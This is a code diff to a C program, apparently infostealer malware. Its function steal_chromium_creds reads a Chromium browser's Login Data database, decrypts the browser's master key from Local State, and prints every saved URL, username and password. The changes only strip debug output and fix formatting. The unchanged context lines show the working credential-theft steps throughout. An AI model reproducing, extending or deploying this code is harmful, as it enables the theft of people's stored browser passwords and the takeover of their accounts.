@@ -104,18 +104,13 @@ static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
     fprintf(stderr, "Failed to finalize statement: %s\n", sqlite3_errmsg(db));
     sqlite3_close(db);
     return EXIT_FAILURE;
-  } else {
-    puts("statement finalized\n");
   }
 
   rc = sqlite3_close_v2(db);
   if (rc != SQLITE_OK) {
     fprintf(stderr, "Failed to close database: %s\n", sqlite3_errmsg(db));
     return EXIT_FAILURE;
-  } else {
-    puts("database close\n");
   }
-
   return EXIT_SUCCESS;
 }
 
@@ -317,10 +312,6 @@ int steal_chromium_creds() {
     return EXIT_FAILURE;
   }
 
-  /// DEBUG
-  wprintf(L"Full path: %ls\n", loginDataPath);
-  ///
-
   //////////////////////////////////////////////////////////////
 
   LoginInfo *logins = NULL;
@@ -330,16 +321,6 @@ int steal_chromium_creds() {
     return EXIT_FAILURE;
   }
 
-  /// DEBUG
-   for (int i = 0; i < loginsCount; i++) {
-     printf("===== LOGIN %d =====\n", i);
-     printf("Origin URL: %s\n", logins[i].url);
-     printf("Username: %s\n", logins[i].username);
-     printf("Password: %s\n", logins[i].passwordBlock);
-   }
-   printf("====================\n");
-  ///
-
   //////////////////////////////////////////////////////////////
 
   PWSTR localStatePath;
@@ -347,9 +328,6 @@ int steal_chromium_creds() {
     fprintf(stderr, "Unable to get local appdata PATH");
     return EXIT_FAILURE;
   }
-  /// DEBUG
-  wprintf(L"localStatePath: %ls\n", localStatePath);
-  ///
 
   //////////////////////////////////////////////////////////////
 
@@ -358,9 +336,6 @@ int steal_chromium_creds() {
     wprintf(L"Could not retrieve key from %s\n", localStatePath);
     return EXIT_FAILURE;
   }
-  /// DEBUG
-  printf("Encrypted key (base64): %s\n", encryptedKey);
-  ///
 
   //////////////////////////////////////////////////////////////
 
@@ -369,10 +344,6 @@ int steal_chromium_creds() {
     fprintf(stderr, "Could not decrypt key\n");
     return EXIT_FAILURE;
   }
-
-  /// DEBUG
-  printf("The key has been decrypted !!\n");
-  ///
 
   //////////////////////////////////////////////////////////////
 
@@ -386,7 +357,7 @@ int steal_chromium_creds() {
   if (decrypt_logins(logins, loginsCount, &credentials, &credentialCount,
                      decryptedBlob.pbData) == EXIT_SUCCESS) {
     for (int i = 0; i < credentialCount; i++) {
-    printf("===== LOGIN %d =====\n", i);
+      printf("===== LOGIN %d =====\n", i);
       printf("URL: %s\n", credentials[i].url);
       printf("Username: %s\n", credentials[i].username);
       printf("Password: %s\n", credentials[i].password);
@@ -394,16 +365,16 @@ int steal_chromium_creds() {
       free(credentials[i].username);
       free(credentials[i].password);
     }
-  printf("====================\n");
+    printf("====================\n");
     free(credentials);
   } else {
     printf("Failed to decrypt logins\n");
   }
 
   free_logins(logins, loginsCount);
-  LocalFree(decryptedBlob.pbData);      // allocated in decrypt_key
-  free(encryptedKey);    // allocated in retrieve_encrypted_key
-  free(localStatePath);  // allocated in get_localstate_path
-  free(loginDataPath);   // allocated in get_logindata_path
+  LocalFree(decryptedBlob.pbData);  // allocated in decrypt_key
+  free(encryptedKey);               // allocated in retrieve_encrypted_key
+  free(localStatePath);             // allocated in get_localstate_path
+  free(loginDataPath);              // allocated in get_logindata_path
   return EXIT_SUCCESS;
 }
